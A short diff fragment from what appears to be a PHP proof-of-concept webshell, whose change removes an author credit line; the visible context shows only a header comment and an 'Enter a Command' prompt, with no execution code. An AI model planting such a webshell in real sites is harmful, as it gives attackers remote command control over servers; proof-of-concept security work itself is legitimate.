@@ -2,7 +2,6 @@
 
 /*
  PoC: A simple webshell
- Author: stayp05 (www.secuacademy.com)
 */
 
 echo 'Enter a Command:<br>';
